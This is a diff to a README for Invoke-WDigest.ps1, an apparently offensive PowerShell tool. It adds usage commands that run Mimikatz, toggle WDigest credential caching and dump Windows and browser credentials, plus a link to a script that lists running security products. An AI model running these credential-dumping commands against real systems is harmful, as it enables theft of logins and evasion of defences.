@@ -79,11 +79,17 @@ WORKFLOW
 <br /><br />
 
 <b><i>Execute Mimikatz (interactive shell) without WDigest caching</i></b><br />
+```powershell
+.\Invoke-WDigest.ps1 -wdigest 'false' -manycats
+```
 ![interactive](https://user-images.githubusercontent.com/23490060/219967042-4559b463-5e3e-470d-8ffe-5111eae7f015.png)
 
 <br />
 
 <b><i>WDigest caching + dump (-runas) created credential with mimikatz</i></b><br />
+```powershell
+.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas
+```
 ![POC2](https://user-images.githubusercontent.com/23490060/219876558-6f68d5cb-e0b7-4bd2-b6e1-689dd8f62792.png)
 
 ![POC3](https://user-images.githubusercontent.com/23490060/219876572-e28d1c22-b6a6-456c-a710-2af8e75f339b.png)
@@ -91,6 +97,9 @@ WORKFLOW
 <br />
 
 <b><i>Dump browsers credentials without WDiget catching</i></b><br />
+```powershell
+.\Invoke-WDigest.ps1 -wdigest 'false' -browsercreds
+```
 ![brcreds](https://user-images.githubusercontent.com/23490060/221413695-a227e1c3-fa2d-43e0-9f50-44b0157a5af0.png)<br />
 ![outlook](https://user-images.githubusercontent.com/23490060/221729426-e7363d4b-fef1-4155-9383-06bbe1479f00.png)
 
@@ -103,4 +112,7 @@ WORKFLOW
 
 <br />
 
+<b><i>Links</i></b>
+
 - [Mimikatz modules list](https://tools.thehacker.recipes/mimikatz/modules)
+- [Enumerate common security processes running](https://github.com/r00t-3xp10it/redpill/blob/main/bin/GetCounterMeasures.ps1)
